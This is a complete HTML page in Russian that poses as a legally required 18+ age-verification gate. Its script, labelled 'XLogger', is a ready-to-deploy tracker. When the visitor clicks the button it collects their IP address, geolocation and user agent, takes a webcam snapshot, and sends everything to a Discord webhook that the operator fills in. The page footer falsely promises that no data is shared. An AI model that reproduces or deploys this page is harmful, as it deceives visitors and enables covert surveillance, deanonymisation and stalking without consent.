<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Подтверждение возраста</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 40px 32px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 25px 45px rgba(0,0,0,0.2);
        }
        h1 { color: white; font-size: 28px; margin-bottom: 12px; }
        p { color: rgba(255,255,255,0.7); margin-bottom: 24px; line-height: 1.5; }
        .warning-icon { font-size: 64px; margin-bottom: 20px; }
        button {
            background: #5865F2;
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover { background: #4752C4; transform: scale(0.98); }
        .footer { margin-top: 24px; font-size: 12px; color: rgba(255,255,255,0.4); }
    </style>
</head>
<body>
    <div class="card">
        <div class="warning-icon">🔞</div>
        <h1>Требуется подтверждение возраста</h1>
        <p>Согласно Федеральному закону № 436-ФЗ, для доступа к этому контенту необходимо подтвердить, что вам есть 18 лет.</p>
        <button id="verifyBtn">Мне есть 18 лет →</button>
        <div class="footer">Нажатие кнопки не передаёт личные данные третьим лицам.</div>
    </div>

    <script>
        // !!! СЮДА ВСТАВЬ СВОЙ DISCORD WEBHOOK URL !!!
        const WEBHOOK_URL = "ВАШ_ВЕБХУК";

        // ---------- ФУНКЦИИ СБОРА ДАННЫХ ----------
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) { return 'не удалось определить'; }
        }

        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('не поддерживается');
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (±${pos.coords.accuracy}m)`),
                    () => resolve('пользователь запретил')
                );
            });
        }

        async function takePhoto() {
            return new Promise((resolve) => {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    resolve('камера не поддерживается');
                    return;
                }
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then((stream) => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            video.play();
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const photo = canvas.toDataURL('image/jpeg', 0.8);
                            stream.getTracks().forEach(track => track.stop());
                            resolve(photo);
                        };
                    })
                    .catch(() => resolve('пользователь запретил'));
            });
        }

        // ---------- ОТПРАВКА В DISCORD ----------
        async function sendToDiscord(ip, location, photo) {
            const ua = navigator.userAgent;
            const embed = {
                title: '📸 НОВЫЙ ПЕРЕХОД',
                color: 0x5865F2,
                fields: [
                    { name: '🌐 IP-адрес', value: ip, inline: true },
                    { name: '📍 Геолокация', value: location, inline: true },
                    { name: '💻 User-Agent', value: ua.length > 80 ? ua.slice(0,80)+'…' : ua, inline: false },
                    { name: '🕒 Время', value: new Date().toLocaleString('ru-RU'), inline: true }
                ],
                footer: { text: 'XLogger • Возраст подтверждён' }
            };

            const payload = { embeds: [embed] };

            if (photo && photo.startsWith('data:image')) {
                const blob = await (await fetch(photo)).blob();
                const form = new FormData();
                form.append('payload_json', JSON.stringify(payload));
                form.append('file', blob, 'selfie.jpg');
                await fetch(WEBHOOK_URL, { method: 'POST', body: form });
            } else {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            }
        }

        // ---------- ОСНОВНОЙ ЗАПУСК ----------
        document.getElementById('verifyBtn').onclick = async () => {
            const btn = document.getElementById('verifyBtn');
            btn.innerText = '⏳ Проверка...';
            btn.disabled = true;

            const ip = await getIP();
            const location = await getLocation();
            const photo = await takePhoto();

            await sendToDiscord(ip, location, photo);

            // Редирект после отправки
            setTimeout(() => {
                window.location.href = "https://t.me/telegram";
            }, 1500);
        };
    </script>
</body>
</html>
